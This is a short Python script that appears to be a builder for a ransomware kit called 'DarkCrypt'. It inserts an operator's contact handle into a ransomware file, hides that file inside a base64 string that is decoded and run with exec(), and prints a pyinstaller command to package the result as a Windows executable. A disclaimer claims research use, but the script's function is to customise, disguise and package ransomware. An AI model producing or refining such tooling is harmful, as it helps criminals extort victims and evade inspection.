import re
import base64
from pystyle import Colorate, Colors
from colorama import Fore

def modify_and_encode(file_path, new_user):
    with open(file_path, 'r') as file:
        lines = file.readlines()

    user_pattern = re.compile(r"^\s*User\s*=\s*['\"](.*)['\"]\s*$")
    for i in range(len(lines)):
        match = user_pattern.match(lines[i])
        if match:
            original_quote = match.group(1)[0]
            lines[i] = f"User = {original_quote}{new_user}{original_quote}\n"

    encoded_content = base64.b64encode(''.join(lines).encode('utf-8')).decode('utf-8')
    decode_script = f"""
import base64

# Base64
base64_encoded = '{encoded_content}'

def decoder_and_run(encoded_code):
    # Decode and ejecute
    decoded_code = base64.b64decode(encoded_code).decode('utf-8')
    exec(decoded_code)

decoder_and_run(base64_encoded)
"""

    with open('encode_ransom.py', 'w') as file:
        file.write(decode_script)

banner = '''
8888b.     db    88""Yb 88  dP  dP""b8 88""Yb Yb  dP 88""Yb 888888
 8I  Yb   dPYb   88__dP 88odP  dP   `" 88__dP  YbdP  88__dP   88
 8I  dY  dP__Yb  88"Yb  88"Yb  Yb      88"Yb    8P   88"""    88
8888Y"  dP""""Yb 88  Yb 88  Yb  YboodP 88  Yb  dP    88       88
                    Created by: 74lg0
                 Windows Ransomware Fake ;)
'''
print(Colorate.Horizontal(Colors.green_to_blue, banner))
print(Fore.RED+"[!] I am not responsible for misuse, the ransomware was created for self-study research purposes,\nbut I do not control its actions")
new_user = input(Fore.YELLOW+"Contact from Ransomware Ej: @74lg0, @Hacker, etc. =>  ")
modify_and_encode('RansomCrypt.py', new_user)
print(Fore.RED+f"!!Utiliza pyinstaller para crear el compilador EXE!!\npyinstaller --onefile encode_ransom.py")
